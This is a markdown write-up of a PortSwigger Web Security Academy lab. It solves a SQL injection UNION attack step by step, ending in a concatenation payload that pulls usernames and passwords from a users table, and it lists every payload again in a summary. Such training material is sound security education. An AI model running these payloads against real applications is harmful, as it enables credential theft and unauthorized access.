# 🛡️ Lab: SQL Injection UNION Attack – Retrieving Multiple Values in a Single Column

## 📌 Platform

* PortSwigger Web Security Academy

---

## 🎯 Objective

Retrieve usernames and passwords from the **users** table when only **one column is usable for output**, and log in as the administrator.

---

# 🔍 Step 1: Identify SQL Injection

### 🧪 Test

```sql
'
```

### 🔍 Observation:

* Page returned an error

### 📌 Conclusion:

* SQL injection is possible

---

# 🧪 Step 2: Determine Number of Columns

### 🧪 ORDER BY Method

```sql
' ORDER BY 1--+
' ORDER BY 2--+
' ORDER BY 3--+
```

### 🔍 Observation:

* Works up to 2
* Error on 3

### 📌 Conclusion:

* Query returns **2 columns**

---

### 🧪 UNION Confirmation

```sql
' UNION SELECT NULL,NULL--+
```

✔ Worked → column count confirmed

---

# 🧠 Step 3: Identify Usable (String) Column

### 🧪 Testing

```sql
' UNION SELECT 'test',NULL--+
' UNION SELECT NULL,'test'--+
```

### 🔍 Observation:

* Only one column accepted string and displayed output

### 📌 Conclusion:

* Only **one column is string-compatible and visible**

---

# ⚠️ Step 4: Problem Faced

### ❌ Attempt

```sql
' UNION SELECT username,password FROM users--+
```

### 🔍 Issue:

* Query failed with error

### 📌 Reason:

* Both `username` and `password` are strings
* But only **one column supports string data**
* Other column expects a different data type (e.g., integer)

---

# ✅ Step 5: Partial Success

### 🧪 Tried

```sql
' UNION SELECT NULL,password FROM users--+
```

✔ Worked

### 📌 Insight:

* `NULL` adapts to required type
* `password` placed in string column

---

# 💡 Step 6: Solution – Concatenate Values

Since only one column is usable:

👉 Combine multiple values into a single column

---

### 🧪 Final Payload (PostgreSQL)

```sql
' UNION SELECT NULL, username || ':' || password FROM users--+
```

---

### ✅ Result:

* Retrieved usernames and passwords in format:

```text
username:password
```

---

# 🔓 Step 7: Login as Administrator

* Extracted admin credentials
* Logged in successfully
* Lab solved

---

# 🧠 Key Learnings

* UNION requires:

  * Same number of columns
  * Compatible data types
* Not all columns are usable for output
* When limited to one column:

  * Use **concatenation** to combine data
* `NULL` helps bypass type mismatch
* PostgreSQL uses:

```sql
||
```

for string concatenation

---

# 🛠️ Payload Summary

### Injection Test

```sql
'
```

### Find Columns

```sql
' ORDER BY 1--+
' ORDER BY 2--+
```

### Confirm UNION

```sql
' UNION SELECT NULL,NULL--+
```

### Test String Column

```sql
' UNION SELECT NULL,'test'--+
```

### Extract Single Value

```sql
' UNION SELECT NULL,password FROM users--+
```

### Final Exploit (Concatenation)

```sql
' UNION SELECT NULL, username || ':' || password FROM users--+
```

---

# 📌 Conclusion

This lab demonstrates how to:

1. Confirm SQL injection
2. Determine column count
3. Identify usable output column
4. Handle data type restrictions
5. Use concatenation to extract multiple values

👉 This technique is critical when dealing with **limited output scenarios in real-world SQL injection**

---
